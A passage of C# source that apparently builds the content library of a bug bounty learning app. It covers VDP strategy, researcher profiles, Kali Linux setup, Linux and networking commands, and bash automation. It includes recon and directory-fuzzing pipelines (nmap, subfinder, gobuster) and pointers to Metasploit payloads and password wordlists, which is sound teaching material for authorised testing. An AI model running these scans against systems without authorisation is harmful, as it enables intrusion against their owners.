                    new StepItem { Number = 1, Description = "Identify VDPs on your preferred platform", Code = "On HackerOne, filter by 'VDP' tag" },
                    new StepItem { Number = 2, Description = "Select 5-10 VDPs to start with", Code = "Choose programs with clear scope and responsive teams" },
                    new StepItem { Number = 3, Description = "Practice reporting on VDPs", Code = "Submit at least 3 reports to understand the process" },
                    new StepItem { Number = 4, Description = "Monitor paid program listings", Code = "Watch for new programs that often have more bugs" },
                    new StepItem { Number = 5, Description = "Apply to private programs", Code = "Use your VDP reports to get invitations" },
                    new StepItem { Number = 6, Description = "Balance your time", Code = "Split time between VDPs for learning and paid programs for income" },
                    new StepItem { Number = 7, Description = "Track your success rate", Code = "Compare acceptance rates between VDPs and paid programs" },
                    new StepItem { Number = 8, Description = "Gradually shift focus", Code = "As skill improves, spend more time on paid programs" }
                },
                Tools = new List<string> { "HackerOne", "Bugcrowd", "Intigriti", "YesWeHack", "HackenProof" },
                Resources = new List<string>
                {
                    "https://www.hackerone.com/vulnerability-disclosure",
                    "https://www.bugcrowd.com/resources/disclosure/",
                    "https://www.intigriti.com/vdp/",
                    "https://www.yeswehack.com/vdp"
                }
            };

            libraryTopics["Intro_Profile"] = new LibraryTopic
            {
                Tag = "Intro_Profile",
                Category = "Getting Started",
                Title = "Creating Your Hacker Profile",
                Subtitle = "Building a Professional Bug Bounty Identity",
                Content = "Your hacker profile is your professional identity in the bug bounty community. It's how programs recognize you, how other researchers know you, and often how employers find you.\n\nPlatform Selection: Most researchers maintain profiles on multiple platforms: HackerOne, Bugcrowd, Intigriti, YesWeHack. Each platform has its own reputation system.\n\nUsername Choice: Your handle becomes your brand. Choose something professional, memorable, and appropriate. Avoid offensive terms or handles that are hard to remember.\n\nProfile Picture: Use a professional photo or avatar that is clear and appropriate.\n\nBio and Description: Write a concise bio describing your skills, interests, and experience. Include your areas of expertise (web, mobile, API, etc.).\n\nReputation Building: Your reputation comes from quality reports, not quantity. Focus on well-documented, impactful findings. One critical finding is worth more than ten duplicates.\n\nSignal-to-Noise Ratio: Programs track your signal (valid reports) vs noise (invalid/duplicate reports). High signal-to-noise ratio makes you valuable.\n\nGitHub Presence: Having a GitHub with security tools, scripts, or writeups demonstrates technical skill.\n\nWriteups and Blogging: Publishing writeups of your findings (after disclosure) builds authority and helps other researchers learn.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Choose your professional handle", Code = "Research if it's available on major platforms" },
                    new StepItem { Number = 2, Description = "Create accounts on major platforms", Code = "HackerOne, Bugcrowd, Intigriti, YesWeHack" },
                    new StepItem { Number = 3, Description = "Write your bio and skills", Code = "Be specific about your expertise areas" },
                    new StepItem { Number = 4, Description = "Add profile picture and links", Code = "Use consistent image across platforms" },
                    new StepItem { Number = 5, Description = "Link social media accounts", Code = "LinkedIn, Twitter, GitHub" },
                    new StepItem { Number = 6, Description = "Complete any verification steps", Code = "Some platforms require identity verification for payments" },
                    new StepItem { Number = 7, Description = "Set notification preferences", Code = "Configure email alerts for program updates" },
                    new StepItem { Number = 8, Description = "Start with quality reports", Code = "Focus on signal, not quantity" },
                    new StepItem { Number = 9, Description = "Track your Hall of Fame entries", Code = "Document your achievements" },
                    new StepItem { Number = 10, Description = "Engage with community", Code = "Follow researchers, join discussions" }
                },
                Tools = new List<string> { "HackerOne", "Bugcrowd", "Intigriti", "YesWeHack", "LinkedIn", "Twitter", "GitHub", "Medium" },
                Resources = new List<string>
                {
                    "https://docs.hackerone.com/hackers/profile.html",
                    "https://docs.bugcrowd.com/researcher/profile/",
                    "https://forum.bugcrowd.com/t/building-a-strong-researcher-profile/"
                }
            };
        }

        
        private void InitializeKaliLinux()
        {
            libraryTopics["Kali_Overview"] = new LibraryTopic
            {
                Tag = "Kali_Overview",
                Category = "Kali Linux",
                Title = "Complete Kali Linux Mastery Guide",
                Subtitle = "Understanding the Hacker's Operating System",
                Content = "Kali Linux is the industry standard operating system for penetration testing, ethical hacking, and security research. Developed and maintained by Offensive Security, Kali comes with over 600 pre-installed tools covering every aspect of security testing.\n\nKali is built on Debian Linux, which means it inherits Debian's stability and massive package repository. The default user is root, giving you full system access.\n\nKey features of Kali include: single-user root access, custom kernel with wireless injection patches, network services disabled by default for stealth, and a vast collection of pre-configured tools.\n\nKali receives regular updates through its rolling release model. New tools and updates are continuously added. Understanding how to keep Kali updated and install additional tools is essential.\n\nFor bug bounty hunters, Kali provides everything needed in one place. The challenge is knowing which tools to use and when. Mastering Kali takes time, but it's an investment that pays off throughout your security career.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sudo apt update && sudo apt full-upgrade -y", Explanation = "Update package lists and perform full system upgrade." },
                    new CommandItem { Text = "apt search <toolname>", Explanation = "Search for tools in Kali repositories." },
                    new CommandItem { Text = "sudo apt install <toolname>", Explanation = "Install additional tools not included in default Kali installation." },
                    new CommandItem { Text = "service <servicename> start/stop/restart", Explanation = "Control services like apache2, ssh, postgresql." },
                    new CommandItem { Text = "systemctl enable <service>", Explanation = "Enable services to start automatically at boot." },
                    new CommandItem { Text = "dpkg -l | grep <tool>", Explanation = "List installed packages and filter for specific tools." },
                    new CommandItem { Text = "whereis <tool>", Explanation = "Find location of installed tools." },
                    new CommandItem { Text = "kali-linux-large", Explanation = "Installs most common Kali tools. Good balance between size and functionality." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Choose your installation method: VM, native, or live USB. VM is recommended for beginners.", Code = "VirtualBox + Kali VM is easiest to manage." },
                    new StepItem { Number = 2, Description = "Download Kali from official source. Verify SHA256 checksum for security.", Code = "https://www.kali.org/get-kali/" },
                    new StepItem { Number = 3, Description = "Install or import Kali. For VM, import the pre-built appliance.", Code = "File > Import Appliance in VirtualBox, select .ova file" },
                    new StepItem { Number = 4, Description = "Boot Kali and log in (default credentials: kali/kali)", Code = "Change default password immediately with 'passwd' command" },
                    new StepItem { Number = 5, Description = "Configure network: ensure internet connectivity.", Code = "Check with 'ping google.com'" },
                    new StepItem { Number = 6, Description = "Update system: run full-upgrade to get latest tools.", Code = "sudo apt update && sudo apt full-upgrade -y" },
                    new StepItem { Number = 7, Description = "Install additional tools: Go-based tools, custom scripts, and wordlists.", Code = "Follow tool-specific installation instructions" },
                    new StepItem { Number = 8, Description = "Test tools: verify that key tools work.", Code = "Run each tool with --help or -h flag" },
                    new StepItem { Number = 9, Description = "Take snapshot: save clean configured state for quick recovery.", Code = "In VM software, take snapshot named 'Clean Configured'" }
                },
                Tools = new List<string> { "Nmap", "Burp Suite", "SQLMap", "Metasploit", "Wireshark", "Aircrack-ng", "John the Ripper", "Hydra", "Nikto", "Dirb", "Gobuster", "Searchsploit", "Maltego", "Ettercap", "Kismet", "Recon-ng", "TheHarvester" },
                Resources = new List<string>
                {
                    "https://www.kali.org/docs/",
                    "https://www.kali.org/tools/",
                    "https://www.offensive-security.com/kali-linux/",
                    "https://forums.kali.org/"
                }
            };

            libraryTopics["Kali_Commands"] = new LibraryTopic
            {
                Tag = "Kali_Commands",
                Category = "Kali Linux",
                Title = "Essential Kali Linux Commands Encyclopedia",
                Subtitle = "Complete Command Reference for Bug Hunters",
                Content = "Mastering the Linux command line is essential for efficient bug hunting. This comprehensive guide covers all the commands you'll need daily, from basic navigation to advanced text processing and automation.\n\nFile System Navigation: Commands like cd, ls, pwd, and find help you locate tools, wordlists, and configuration files quickly.\n\nText Processing: Bug hunting involves massive amounts of text data - subdomain lists, scan results, response data. Commands like grep, awk, sed, cut, sort, uniq are your best friends.\n\nProcess Management: Commands like ps, top, kill, jobs, fg, bg help you manage running processes effectively.\n\nNetwork Commands: Checking network connectivity, DNS resolution, and making HTTP requests are daily tasks using ping, curl, wget, dig, nslookup, and netstat.\n\nThe power of Linux comes from combining commands with pipes (|) and redirections (>, >>). This is how you build powerful one-liners for automation.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "ls -la", Explanation = "List all files including hidden files with detailed information. Essential for exploring directories." },
                    new CommandItem { Text = "cd /path/to/directory", Explanation = "Change directory. Use cd ~ for home, cd .. for parent directory, cd - for previous directory." },
                    new CommandItem { Text = "pwd", Explanation = "Print working directory - shows your current location in the file system." },
                    new CommandItem { Text = "mkdir -p path/to/dir", Explanation = "Create directory. -p creates parent directories as needed." },
                    new CommandItem { Text = "cp -r source destination", Explanation = "Copy files or directories. -r for recursive (copy directories)." },
                    new CommandItem { Text = "mv source destination", Explanation = "Move or rename files. Works across filesystems." },
                    new CommandItem { Text = "rm -rf file/dir", Explanation = "Remove files or directories. -r for recursive, -f for force. VERY DANGEROUS - use carefully." },
                    new CommandItem { Text = "chmod +x script.sh", Explanation = "Make script executable. +x adds execute permission." },
                    new CommandItem { Text = "grep -r 'pattern' /path/", Explanation = "Search recursively for pattern in files. -i for case-insensitive, -n for line numbers." },
                    new CommandItem { Text = "grep -E 'regex' file.txt", Explanation = "Use extended regular expressions for complex pattern matching." },
                    new CommandItem { Text = "awk '{print $1}' file.txt", Explanation = "Print first column of space-separated data. Great for extracting specific fields." },
                    new CommandItem { Text = "sed 's/old/new/g' file.txt", Explanation = "Replace text globally. -i for in-place editing." },
                    new CommandItem { Text = "cut -d ',' -f1 file.csv", Explanation = "Cut specific fields from delimited data. -d sets delimiter, -f selects fields." },
                    new CommandItem { Text = "sort -u file.txt", Explanation = "Sort lines alphabetically. -u for unique (remove duplicates)." },
                    new CommandItem { Text = "uniq -c file.txt", Explanation = "Report or omit repeated lines. -c counts occurrences." },
                    new CommandItem { Text = "wc -l file.txt", Explanation = "Word count. -l for lines, -w for words, -c for characters." },
                    new CommandItem { Text = "ps aux | grep process", Explanation = "List running processes. aux shows all users, detailed format." },
                    new CommandItem { Text = "kill -9 PID", Explanation = "Force kill process by Process ID. -9 is SIGKILL." },
                    new CommandItem { Text = "nohup command &", Explanation = "Run command immune to hangups. & backgrounds it." },
                    new CommandItem { Text = "curl -I https://target.com", Explanation = "Make HTTP requests. -I for headers only, -L follow redirects." },
                    new CommandItem { Text = "wget -r -l2 https://target.com", Explanation = "Download files. -r recursive, -l depth limit." },
                    new CommandItem { Text = "dig target.com ANY", Explanation = "DNS lookup utility. ANY returns all record types." },
                    new CommandItem { Text = "nslookup target.com", Explanation = "Query DNS records interactively or non-interactively." },
                    new CommandItem { Text = "netstat -tulpn", Explanation = "Show network statistics. See open ports and services." },
                    new CommandItem { Text = "ss -tulpn", Explanation = "Modern replacement for netstat. Faster and more detailed." },
                    new CommandItem { Text = "ip addr show", Explanation = "Show network interfaces and IP addresses." },
                    new CommandItem { Text = "traceroute target.com", Explanation = "Trace path packets take to destination." },
                    new CommandItem { Text = "sudo apt update", Explanation = "Update package lists from repositories." },
                    new CommandItem { Text = "sudo apt upgrade -y", Explanation = "Upgrade installed packages. -y auto-confirms." },
                    new CommandItem { Text = "sudo apt install package", Explanation = "Install new package." },
                    new CommandItem { Text = "apt search keyword", Explanation = "Search package repositories for keyword." },
                    new CommandItem { Text = "tar -xzf file.tar.gz", Explanation = "Extract compressed tar archive." },
                    new CommandItem { Text = "unzip file.zip -d /target/", Explanation = "Extract zip archive. -d specifies destination directory." },
                    new CommandItem { Text = "echo $PATH", Explanation = "Show PATH environment variable. Directories searched for executables." },
                    new CommandItem { Text = "export PATH=$PATH:/new/path", Explanation = "Add directory to PATH temporarily. Add to .bashrc for permanent." },
                    new CommandItem { Text = "source ~/.bashrc", Explanation = "Reload bash configuration after editing." },
                    new CommandItem { Text = "history", Explanation = "Show command history. !123 runs command 123. Ctrl+R searches." },
                    new CommandItem { Text = "man command", Explanation = "Show manual page for command. Press q to quit, / to search within." }
                }
            };

            libraryTopics["Kali_Navigation"] = new LibraryTopic
            {
                Tag = "Kali_Navigation",
                Category = "Kali Linux",
                Title = "File System Navigation Mastery",
                Subtitle = "Moving Efficiently Through the Linux File System",
                Content = "Efficient file system navigation is foundational to working in Linux. Bug hunters spend hours navigating directories of tools, wordlists, scan results, and reports. Mastering navigation commands dramatically improves your productivity.\n\nLinux File System Hierarchy: The Linux file system follows the Filesystem Hierarchy Standard (FHS). Key directories include:\n/bin and /usr/bin - Essential user command binaries\n/sbin and /usr/sbin - System administration binaries\n/etc - Configuration files for all programs\n/home - User home directories\n/var - Variable data (logs, spool, etc.)\n/tmp - Temporary files\n/opt - Optional application software packages\n/usr/share - Architecture-independent shared data\n/usr/share/wordlists - Password and wordlist files in Kali\n/usr/share/nmap - Nmap scripts and data files\n/root - Root user home directory\n\nKey Navigation Concepts: Understanding absolute vs relative paths, using shortcuts, and leveraging auto-completion are essential skills.\n\nKali-Specific Locations: /usr/share/metasploit-framework, /usr/share/burpsuite, /usr/share/sqlmap, /usr/share/gobuster, /usr/share/nmap/scripts are important directories.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "cd ~", Explanation = "Change to home directory. Equivalent to 'cd /home/username' or 'cd /root' for root user." },
                    new CommandItem { Text = "cd -", Explanation = "Switch to previous directory. Extremely useful for toggling between two directories." },
                    new CommandItem { Text = "cd ..", Explanation = "Go up one directory level to parent." },
                    new CommandItem { Text = "cd ../../../", Explanation = "Go up multiple levels. Count the ../ for each level you want to go up." },
                    new CommandItem { Text = "ls -la --color=auto", Explanation = "List all files with colors. Hidden files start with dot. Shows permissions, size, owner, date." },
                    new CommandItem { Text = "ls -lhS", Explanation = "List files sorted by size, human-readable. -h converts bytes to KB/MB/GB." },
                    new CommandItem { Text = "ls -lt", Explanation = "List files sorted by modification time. Most recent first. Add -r to reverse." },
                    new CommandItem { Text = "find / -name 'filename' 2>/dev/null", Explanation = "Find files by name system-wide. 2>/dev/null suppresses permission errors." },
                    new CommandItem { Text = "find . -type f -name '*.txt'", Explanation = "Find all .txt files in current directory and subdirectories." },
                    new CommandItem { Text = "find . -mtime -1", Explanation = "Find files modified in the last day. Change 1 to any number of days." },
                    new CommandItem { Text = "find . -size +10M", Explanation = "Find files larger than 10 megabytes. +10M for MB, +10k for KB, +10G for GB." },
                    new CommandItem { Text = "locate filename", Explanation = "Fast file search using database. Run 'updatedb' first to update database." },
                    new CommandItem { Text = "which tool", Explanation = "Show full path of command/tool. Essential for finding where tools are installed." },
                    new CommandItem { Text = "type command", Explanation = "Shows information about command type (alias, builtin, file)." },
                    new CommandItem { Text = "du -sh directory/", Explanation = "Show disk usage of directory. -s for summary, -h for human-readable." },
                    new CommandItem { Text = "df -h", Explanation = "Show free disk space on all mounted filesystems." },
                    new CommandItem { Text = "tree /path/", Explanation = "Display directory structure as tree. Install with: apt install tree" },
                    new CommandItem { Text = "pushd /path/ && popd", Explanation = "Push directory onto stack and pop it. Useful for returning to previous locations." },
                    new CommandItem { Text = "ln -s /source /link", Explanation = "Create symbolic link. Useful for creating shortcuts to tools and directories." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Learn the Linux directory hierarchy and memorize key locations", Code = "man hier" },
                    new StepItem { Number = 2, Description = "Practice using absolute and relative paths", Code = "Navigate between /usr/share/wordlists and ~/bugbounty" },
                    new StepItem { Number = 3, Description = "Master tab completion for speed", Code = "Type first few characters and press Tab twice" },
                    new StepItem { Number = 4, Description = "Use history and reverse search (Ctrl+R)", Code = "history | grep nmap" },
                    new StepItem { Number = 5, Description = "Create aliases for common navigations", Code = "alias bb='cd ~/bugbounty'" },
                    new StepItem { Number = 6, Description = "Memorize find command for quick file searches", Code = "find /usr/share -name '*.txt' 2>/dev/null" }
                },
                Tools = new List<string> { "find", "locate", "ls", "tree", "du", "df", "which", "type" }
            };

            libraryTopics["Kali_Packages"] = new LibraryTopic
            {
                Tag = "Kali_Packages",
                Category = "Kali Linux",
                Title = "Package Management Deep Dive",
                Subtitle = "Installing, Updating, and Managing Tools in Kali Linux",
                Content = "Package management in Kali Linux is how you install, update, and remove software. Understanding APT (Advanced Package Tool) deeply helps you maintain a well-organized and up-to-date hacking environment.\n\nAPT Package Manager: Kali uses APT as its primary package manager, inherited from Debian. APT manages .deb packages from configured repositories. The main commands are apt update, apt upgrade, apt install, apt remove, and apt search.\n\nKali Repositories: Kali maintains its own repositories separate from Debian. The main repository contains all official Kali tools. Additional repositories can be added for specific tools. Never add random repositories as they may contain malicious packages.\n\nManual Installation Methods: Not all tools are available in repositories. Common installation methods include: git clone + make/cmake, pip/pip3 for Python tools, go install for Go tools, gem install for Ruby tools, npm install for Node.js tools.\n\nPackage Groups: Kali offers pre-configured tool groups like kali-linux-top10, kali-linux-web, kali-linux-forensics, etc. These install related tools as a bundle.\n\nManaging Dependencies: APT automatically resolves dependencies. If manual installation has dependency issues, try installing them with apt first.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sudo apt update", Explanation = "Refresh package lists from all configured repositories. Run before any install or upgrade." },
                    new CommandItem { Text = "sudo apt upgrade -y", Explanation = "Upgrade all installed packages to latest versions. -y auto-accepts." },
                    new CommandItem { Text = "sudo apt full-upgrade -y", Explanation = "Upgrade with permission to remove obsolete packages. Preferred over simple upgrade." },
                    new CommandItem { Text = "sudo apt install packagename", Explanation = "Install specific package. Multiple packages: apt install pkg1 pkg2 pkg3." },
                    new CommandItem { Text = "sudo apt remove packagename", Explanation = "Remove package but keep configuration files." },
                    new CommandItem { Text = "sudo apt purge packagename", Explanation = "Remove package AND configuration files completely." },
                    new CommandItem { Text = "sudo apt autoremove", Explanation = "Remove packages that were automatically installed as dependencies but no longer needed." },
                    new CommandItem { Text = "apt search keyword", Explanation = "Search package names and descriptions. Pipe to grep for specific filtering." },
                    new CommandItem { Text = "apt show packagename", Explanation = "Show detailed information about a package: description, dependencies, size." },
                    new CommandItem { Text = "apt list --installed", Explanation = "List all installed packages. Pipe to grep to find specific ones." },
                    new CommandItem { Text = "apt list --upgradable", Explanation = "List packages with available upgrades." },
                    new CommandItem { Text = "dpkg -l | grep partial", Explanation = "Check for packages in broken/partial state." },
                    new CommandItem { Text = "dpkg --get-selections | grep -v deinstall", Explanation = "List all installed packages in dpkg format." },
                    new CommandItem { Text = "pip3 install --upgrade pip", Explanation = "Upgrade pip itself before installing Python tools." },
                    new CommandItem { Text = "pip3 install toolname --break-system-packages", Explanation = "Install Python tool system-wide. Use --break-system-packages if needed in Kali." },
                    new CommandItem { Text = "go install github.com/user/tool@latest", Explanation = "Install Go-based tools. Requires Go installed and GOPATH configured." },
                    new CommandItem { Text = "gem install toolname", Explanation = "Install Ruby gems. Used for tools like WPScan." },
                    new CommandItem { Text = "npm install -g toolname", Explanation = "Install Node.js tools globally. Used for some web security tools." },
                    new CommandItem { Text = "sudo apt install kali-linux-top10", Explanation = "Install the top 10 Kali tools bundle. Good starting package selection." },
                    new CommandItem { Text = "sudo apt install kali-linux-web", Explanation = "Install all web application testing tools from Kali." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Update package lists daily before starting work", Code = "sudo apt update" },
                    new StepItem { Number = 2, Description = "Install essential meta-packages", Code = "sudo apt install kali-linux-web kali-linux-top10" },
                    new StepItem { Number = 3, Description = "Install Go for modern tools", Code = "sudo apt install golang" },
                    new StepItem { Number = 4, Description = "Install Python package manager", Code = "sudo apt install python3-pip" },
                    new StepItem { Number = 5, Description = "Clone and install custom tools from GitHub", Code = "git clone repo && cd repo && pip3 install -r requirements.txt" },
                    new StepItem { Number = 6, Description = "Keep a list of your installed custom tools", Code = "Maintain ~/bugbounty/setup.sh for automated reinstall" }
                },
                Tools = new List<string> { "apt", "dpkg", "pip3", "go", "gem", "npm", "git", "snap", "flatpak" }
            };

            libraryTopics["Kali_Network"] = new LibraryTopic
            {
                Tag = "Kali_Network",
                Category = "Kali Linux",
                Title = "Network Configuration in Kali",
                Subtitle = "Setting Up and Managing Network Interfaces",
                Content = "Network configuration in Kali Linux is essential for bug bounty work. You need to manage network interfaces, configure proxies, set up VPNs, and ensure proper connectivity for testing.\n\nNetwork Interface Management: Kali uses NetworkManager by default for network management. You can also configure interfaces manually through command-line tools.\n\nVPN Configuration: Using a VPN during bug bounty testing is optional but recommended for privacy. Kali supports OpenVPN, WireGuard, and other VPN protocols natively.\n\nProxy Configuration: Routing traffic through Burp Suite requires either browser proxy settings or system-wide proxy configuration. Understanding how to configure this correctly is essential.\n\nFirewall and iptables: Kali includes iptables for firewall management. Understanding basic iptables rules helps you control network traffic during testing.\n\nNetwork Monitoring: Tools like Wireshark and tcpdump capture and analyze network traffic. This is valuable for understanding how applications communicate.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "ip addr show", Explanation = "Show all network interfaces and their IP addresses. Modern replacement for ifconfig." },
                    new CommandItem { Text = "ip link set eth0 up/down", Explanation = "Enable or disable a network interface. Replace eth0 with your interface name." },
                    new CommandItem { Text = "ip route show", Explanation = "Display routing table. Shows how traffic is routed through interfaces." },
                    new CommandItem { Text = "ip route add default via 192.168.1.1", Explanation = "Add default gateway. Replace IP with your router's IP." },
                    new CommandItem { Text = "nmcli device show", Explanation = "NetworkManager command to show device details including IP, DNS, gateway." },
                    new CommandItem { Text = "nmcli connection list", Explanation = "List all saved network connections." },
                    new CommandItem { Text = "systemctl restart NetworkManager", Explanation = "Restart network manager if connectivity issues arise." },
                    new CommandItem { Text = "sudo openvpn --config file.ovpn", Explanation = "Connect to VPN using OpenVPN configuration file." },
                    new CommandItem { Text = "export https_proxy=http://127.0.0.1:8080", Explanation = "Set system proxy for HTTPS traffic to route through Burp Suite." },
                    new CommandItem { Text = "export http_proxy=http://127.0.0.1:8080", Explanation = "Set system proxy for HTTP traffic to route through Burp Suite." },
                    new CommandItem { Text = "sudo tcpdump -i eth0 -w capture.pcap", Explanation = "Capture network traffic on interface. Save to file for analysis in Wireshark." },
                    new CommandItem { Text = "netstat -an | grep ESTABLISHED", Explanation = "Show all established connections. Useful for monitoring active sessions." },
                    new CommandItem { Text = "ss -tunap", Explanation = "Show all TCP/UDP connections with process names. Modern, faster than netstat." },
                    new CommandItem { Text = "iptables -L -n -v", Explanation = "List all firewall rules with packet counts and interface information." },
                    new CommandItem { Text = "cat /etc/resolv.conf", Explanation = "View current DNS server configuration." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Verify network connectivity in Kali VM", Code = "ping -c 4 8.8.8.8" },
                    new StepItem { Number = 2, Description = "Configure Burp Suite as system proxy", Code = "export http_proxy=http://127.0.0.1:8080" },
                    new StepItem { Number = 3, Description = "Install Burp CA certificate in browser", Code = "Navigate to http://burp and download cert" },
                    new StepItem { Number = 4, Description = "Configure VPN if needed", Code = "sudo openvpn --config vpn.ovpn" },
                    new StepItem { Number = 5, Description = "Test proxy is working", Code = "curl -x http://127.0.0.1:8080 https://target.com" }
                },
                Tools = new List<string> { "NetworkManager", "nmcli", "ip", "ifconfig", "iptables", "OpenVPN", "WireGuard", "tcpdump", "Wireshark", "netstat", "ss" }
            };

            libraryTopics["Kali_Bash"] = new LibraryTopic
            {
                Tag = "Kali_Bash",
                Category = "Kali Linux",
                Title = "Bash Scripting for Hackers",
                Subtitle = "Automating Bug Bounty Tasks with Shell Scripts",
                Content = "Bash scripting is a fundamental skill for bug bounty hunters. Automating repetitive tasks saves hours of time and allows you to run continuous reconnaissance. This guide teaches bash scripting through the lens of security testing and automation.\n\nWhy Bash Scripting? Many bug hunting tasks are repetitive: running multiple tools, processing output, managing targets. Bash scripts chain these together into automated workflows. Instead of manually running 10 commands, a script handles everything.\n\nScript Structure: Every bash script starts with a shebang line (#!/bin/bash), followed by variable declarations, functions, and the main logic. Good scripts include error handling and usage instructions.\n\nVariables and Arrays: Store domain names, wordlists, and results in variables and arrays. Process multiple targets by iterating over arrays.\n\nLoops and Conditionals: For loops process multiple targets. While loops wait for conditions. If statements handle different scenarios and errors.\n\nInput/Output Redirection: Capture tool output to files, filter results, and pipe between commands. This is where the real power comes.\n\nPractical Examples: Common scripts include recon automation, subdomain enumeration pipelines, port scanning with reporting, and directory fuzzing workflows.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "#!/bin/bash", Explanation = "Shebang line. Must be first line of every bash script. Tells OS to use bash interpreter." },
                    new CommandItem { Text = "variable='value'", Explanation = "Variable assignment. No spaces around =. Access with $variable." },
                    new CommandItem { Text = "for domain in $(cat domains.txt); do echo $domain; done", Explanation = "Loop over file contents. Common pattern for processing target lists." },
                    new CommandItem { Text = "while read line; do echo $line; done < file.txt", Explanation = "Read file line by line with while loop. Handles special characters better than for." },
                    new CommandItem { Text = "if [ -f file.txt ]; then echo 'exists'; fi", Explanation = "Conditional check if file exists. -f for file, -d for directory, -z for empty string." },
                    new CommandItem { Text = "command 2>/dev/null", Explanation = "Redirect stderr to /dev/null (discard errors). Clean output from noisy tools." },
                    new CommandItem { Text = "command > output.txt 2>&1", Explanation = "Redirect both stdout and stderr to file. Captures all output." },
                    new CommandItem { Text = "command | tee output.txt", Explanation = "Display output AND save to file simultaneously. Best of both worlds." },
                    new CommandItem { Text = "sleep 1", Explanation = "Pause for 1 second. Useful for rate limiting and API calls." },
                    new CommandItem { Text = "[ $? -eq 0 ] && echo 'success' || echo 'fail'", Explanation = "Check exit code of last command. $? is exit code, 0 means success." },
                    new CommandItem { Text = "echo 'text' | base64", Explanation = "Encode text to base64. Useful for encoding payloads." },
                    new CommandItem { Text = "echo 'dGVzdA==' | base64 -d", Explanation = "Decode base64 encoded text." },
                    new CommandItem { Text = "date +%Y%m%d_%H%M%S", Explanation = "Get formatted timestamp. Use in filenames for organized output files." },
                    new CommandItem { Text = "mkdir -p output/$(date +%Y%m%d)", Explanation = "Create date-stamped output directories automatically." },
                    new CommandItem { Text = "parallel -j 10 'command {}' ::: $(cat list.txt)", Explanation = "Run commands in parallel with GNU parallel. -j sets number of parallel jobs." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Write a simple recon script", Code = "#!/bin/bash\ndomain=$1\nnmap -sV $domain > recon_$domain.txt" },
                    new StepItem { Number = 2, Description = "Add error handling to scripts", Code = "if [ -z \"$1\" ]; then echo 'Usage: $0 domain'; exit 1; fi" },
                    new StepItem { Number = 3, Description = "Create a subdomain enumeration pipeline", Code = "subfinder -d $domain | httpx | tee live_subdomains.txt" },
                    new StepItem { Number = 4, Description = "Build a directory fuzzing automation", Code = "while read sub; do gobuster dir -u $sub -w wordlist.txt; done < live_subdomains.txt" },
                    new StepItem { Number = 5, Description = "Add logging to all scripts", Code = "exec > >(tee -a scan_$domain.log) 2>&1" },
                    new StepItem { Number = 6, Description = "Make scripts executable and add to PATH", Code = "chmod +x myscript.sh && cp myscript.sh /usr/local/bin/myscript" }
                },
                Tools = new List<string> { "bash", "sh", "zsh", "awk", "sed", "grep", "parallel", "tee", "xargs" }
            };

            libraryTopics["Kali_ToolsDir"] = new LibraryTopic
            {
                Tag = "Kali_ToolsDir",
                Category = "Kali Linux",
                Title = "Kali Tools Directory Explained",
                Subtitle = "Navigating Kali's Extensive Tool Collection",
                Content = "Kali Linux contains hundreds of pre-installed security tools organized in categories. Understanding where tools are located and how they're organized saves time and helps you discover tools you didn't know existed.\n\nTool Categories in Kali: Kali organizes tools into these main categories accessible from the Applications menu:\n- Information Gathering\n- Vulnerability Analysis\n- Web Application Analysis\n- Database Assessment\n- Password Attacks\n- Wireless Attacks\n- Reverse Engineering\n- Exploitation Tools\n- Sniffing & Spoofing\n- Post Exploitation\n- Forensics\n- Reporting Tools\n- Social Engineering\n\nTool Locations: Most tools are in /usr/bin or /usr/sbin. Kali-specific tools often have support files in /usr/share/toolname. Scripts for tools are often in /usr/share/toolname/scripts.\n\nWordlists Location: /usr/share/wordlists contains password and username lists. /usr/share/seclists (if installed) has comprehensive categorized lists.\n\nNmap Scripts: /usr/share/nmap/scripts contains hundreds of NSE scripts for various scan types.\n\nMetasploit Framework: /usr/share/metasploit-framework contains all modules, scripts, and payloads.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "ls /usr/share/wordlists/", Explanation = "List available wordlists. Common ones: rockyou.txt, fasttrack.txt." },
                    new CommandItem { Text = "ls /usr/share/nmap/scripts/", Explanation = "List all Nmap NSE scripts. Use nmap --script to run specific ones." },
                    new CommandItem { Text = "ls /usr/share/metasploit-framework/modules/", Explanation = "List Metasploit module categories: auxiliary, exploits, payloads, post." },
                    new CommandItem { Text = "find /usr/share -name 'rockyou*'", Explanation = "Find rockyou password list. May need to decompress: gunzip rockyou.txt.gz" },
                    new CommandItem { Text = "ls /usr/share/sqlmap/", Explanation = "SQLMap installation directory with tamper scripts, payloads, and wordlists." },
                    new CommandItem { Text = "ls /usr/share/burpsuite/", Explanation = "Burp Suite directory with extensions and configuration files." },
                    new CommandItem { Text = "which tool && tool --help", Explanation = "Find tool path and display help. Good for discovering tool options." },
                    new CommandItem { Text = "apt list --installed 2>/dev/null | grep kali", Explanation = "List all installed Kali-specific packages." }
                },
                Tools = new List<string> { "ls", "find", "which", "apt", "locate" },
                Resources = new List<string>
                {
                    "https://www.kali.org/tools/",
                    "https://www.kali.org/docs/general-use/metapackages/",
                    "https://gitlab.com/kalilinux/packages"
                }
            };

            libraryTopics["Kali_Custom"] = new LibraryTopic
            {
                Tag = "Kali_Custom",
                Category = "Kali Linux",
                Title = "Customizing Your Kali Environment",
                Subtitle = "Optimizing Kali Linux for Bug Bounty Work",
